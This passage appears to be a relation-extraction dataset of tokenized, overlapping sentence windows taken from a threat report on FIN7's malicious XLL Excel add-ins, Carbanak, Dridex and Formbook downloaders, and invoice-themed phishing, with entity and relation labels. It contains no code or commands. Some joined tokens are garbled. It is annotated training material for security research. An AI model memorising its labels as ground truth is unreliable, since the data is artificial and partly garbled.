"attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "actors", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "XLL files", "pos": [16, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "SHA", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "SHA", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "it", "pos": [11, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [78, 78], "name": "svchost.exe", "pos": [25, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "DLL", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "SHA", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "DLL", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "SHA", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "1. xll", "pos": [12, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "DLL", "pos": [1, 2], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "EX", "evidence": [2], "t": 3, "h": 4}, {"r": "IJ", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "EX", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3], "h": 6, "t": 8}, {"r": "CO", "evidence": [4], "h": 9, "t": 11}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}]}, {"title": "607-32", "sents": [["In", "July", "2017", ",", "a", "test", "sample", "with", "SHA256", "SHA", ",", "used", "to", "launch", "calc.exe", ",", "was", "submitted", "."], ["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "SHA", "pos": [9, 10], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "SHA", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "it", "pos": [11, 12], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [44, 44], "name": "svchost.exe", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "DLL", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "SHA", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "DLL", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "SHA", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "1. xll", "pos": [12, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "DLL", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [158, 158], "name": "Carbanak malware", "pos": [4, 6], "index": "11_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "EX", "evidence": [1], "t": 1, "h": 2}, {"r": "IJ", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "EX", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "RD", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 11}, {"r": "WR", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 11}, {"r": "EX", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 11}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [3], "h": 7, "t": 9}, {"r": "CO", "evidence": [3], "h": 7, "t": 8}]}, {"title": "607-33", "sents": [["The", "sample", "SHA", "was", "submitted", "to", "VirusTotal", "in", "December", "2017", "and", "it", "contains", "functionality", "to", "inject", "the", "Backdoor", "Anel", "payload", "into", "the", "process", "space", "of", "svchost.exe", "."], ["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "SHA", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "it", "pos": [11, 12], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [25, 25], "name": "svchost.exe", "pos": [25, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "DLL", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "SHA", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "DLL", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "SHA", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "1. xll", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [97, 97], "name": "DLL", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "Carbanak malware", "pos": [4, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [146, 146], "name": "FIN7", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [149, 149], "name": "XLLs", "pos": [7, 8], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "IJ", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 2, "t": 9}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 2, "t": 9}, {"r": "EX", "evidence": [0, 1, 2, 3], "h": 2, "t": 9}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 2, "t": 10}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 2, "t": 10}, {"r": "EX", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 2, "t": 10}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "t": 9, "h": 11}, {"r": "WR", "evidence": [6, 7], "t": 10, "h": 11}, {"r": "WR", "evidence": [6, 7], "t": 10, "h": 11}]}, {"title": "607-34", "sents": [["One", "of", "the", "components", "in", "the", "attack", ",", "a", "process", "injection", "DLL", "named", "onkeytoken_keb.dll", "(", "SHA", ")", ",", "also", "contains", "an", "xlAutoOpen", "export", ",", "although", "no", "malicious", "functionality", "is", "executed", "when", "calling", "it", "(", "the", "injector", "is", "triggered", "by", "calling", "the", "exported", "function", "OnKeyT_ContextInit", ")", "."], ["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "DLL", "pos": [11, 12], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "onkeytoken_keb.dll", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "SHA", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "DLL", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "SHA", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [58, 58], "name": "1. xll", "pos": [12, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "DLL", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "Carbanak malware", "pos": [4, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [119, 119], "name": "FIN7", "pos": [4, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [122, 122], "name": "XLLs", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [135, 135], "name": "XLL file", "pos": [4, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "HASH", "pos": [11, 12], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [144, 144], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "12_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "t": 6, "h": 8}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 10}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 11}]}, {"title": "607-35", "sents": [["On", "October", "7th", "2022", ",", "a", "DLL", "SHA", ",", "with", "the", "name", "1.", "xll", ",", "was", "uploaded", "from", "a", "user", "in", "Pakistan", "."], ["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "DLL", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "SHA", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "1. xll", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "DLL", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "Carbanak malware", "pos": [4, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [73, 73], "name": "FIN7", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [76, 76], "name": "XLLs", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [89, 89], "name": "XLL file", "pos": [4, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [96, 96], "name": "HASH", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [98, 98], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [105, 105], "name": "file", "pos": [1, 2], "index": "10_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "t": 3, "h": 5}, {"r": "WR", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "WR", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 9}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 7}, {"r": "CO", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "CO", "evidence": [5, 6, 7], "h": 6, "t": 10}]}, {"title": "607-36", "sents": [["The", "DLL", "contains", "two", "exports", "."], ["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "DLL", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [43, 43], "name": "Carbanak malware", "pos": [4, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [50, 50], "name": "FIN7", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [53, 53], "name": "XLLs", "pos": [7, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [66, 66], "name": "XLL file", "pos": [4, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [73, 73], "name": "HASH", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [75, 75], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [82, 82], "name": "file", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [93, 93], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "8_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3, 4], "t": 0, "h": 2}, {"r": "WR", "evidence": [3, 4], "t": 1, "h": 2}, {"r": "WR", "evidence": [3, 4], "t": 1, "h": 2}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 6}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 4}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 5}, {"r": "CO", "evidence": [4, 5, 6], "h": 3, "t": 7}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 3, "t": 8}]}, {"title": "607-37", "sents": [["The", "second", "export", "name", "is", "xlAutoOpen", ",", "which", "makes", "the", "implant", "a", "fully", "functional", ",", "native-based", "XLL", "payload", "."], ["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."]], "vertexSet": [[{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "Carbanak malware", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [44, 44], "name": "FIN7", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [47, 47], "name": "XLLs", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [60, 60], "name": "XLL file", "pos": [4, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [67, 67], "name": "HASH", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [69, 69], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [76, 76], "name": "file", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [87, 87], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "7_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [113, 113], "name": "hostCommodity", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [115, 115], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [121, 121], "name": "HASH", "pos": [18, 19], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [2, 3], "t": 0, "h": 1}, {"r": "WR", "evidence": [2, 3], "t": 0, "h": 1}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "h": 1, "t": 8}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "h": 1, "t": 8}, {"r": "ST", "evidence": [3, 4, 5, 6, 7], "h": 1, "t": 8}, {"r": "RF", "evidence": [3, 4, 5, 6, 7], "h": 1, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 3}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 4}, {"r": "CO", "evidence": [3, 4, 5], "h": 2, "t": 6}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 2, "t": 7}, {"r": "CO", "evidence": [7], "h": 9, "t": 10}]}, {"title": "607-38", "sents": [["FIN7", "is", "using", "a", "number", "of", "payloads", "and", "different", "infection", "techniques", ",", "including", "."], ["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "Carbanak malware", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "FIN7", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [28, 28], "name": "XLLs", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [41, 41], "name": "XLL file", "pos": [4, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [48, 48], "name": "HASH", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [50, 50], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [57, 57], "name": "file", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [68, 68], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [94, 94], "name": "hostCommodity", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [96, 96], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [102, 102], "name": "HASH", "pos": [18, 19], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [124, 124], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "HASH", "pos": [5, 6], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "h": 1, "t": 8}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "h": 1, "t": 8}, {"r": "ST", "evidence": [2, 3, 4, 5, 6], "h": 1, "t": 8}, {"r": "RF", "evidence": [2, 3, 4, 5, 6], "h": 1, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 7}, {"r": "CO", "evidence": [6], "h": 9, "t": 10}, {"r": "CO", "evidence": [7], "h": 11, "t": 12}]}, {"title": "607-39", "sents": [["FIN7", "most", "commonly", "uses", "Carbanak", "malware", "."], ["Earlier", "this", "year", ",", "FIN7", "started", "using", "XLLs", "sent", "as", "attachments", "in", "malicious", "email", "campaigns", "."], ["For", "example", ",", "the", "XLL", "file", "from", "a", "February", "campaign", "was", "HASH", "``", "Quickbooks", "-", "40127.", "xll", "''", "."], ["The", "file", "serves", "as", "a", "downloader", "for", "the", "next", "stage", "."], ["The", "FIN7", "XLL", "downloaders", "are", "interesting", "as", "they", "appear", "to", "have", "been", "created", "with", "the", "Excel-DNA", "."], ["Modified", "FIN7", "Excel-DNA", "shim", "downloader", "connects", "to", "an", "attacker", "controlled", "hostCommodity", "malware", "familiesDridex", "downloaderDridex", "downloaders", ",", "such", "as", "HASH", ",", "are", "responsible", "for", "the", "major", "peak", "in", "the", "number", "of", "XLL", "files", "submitted", "to", "VirusTotal", "in", "late", "2021", "."], ["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "Carbanak malware", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [11, 11], "name": "FIN7", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "XLLs", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [27, 27], "name": "XLL file", "pos": [4, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [34, 34], "name": "HASH", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "Quickbooks - 40127. xll", "pos": [13, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [43, 43], "name": "file", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [54, 54], "name": "FIN7 XLL downloaders", "pos": [1, 4], "index": "7_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [80, 80], "name": "hostCommodity", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [82, 82], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "HASH", "pos": [18, 19], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "HASH", "pos": [5, 6], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [134, 134], "name": "user", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [138, 138], "name": "XLL file", "pos": [6, 8], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [143, 143], "name": "downloader", "pos": 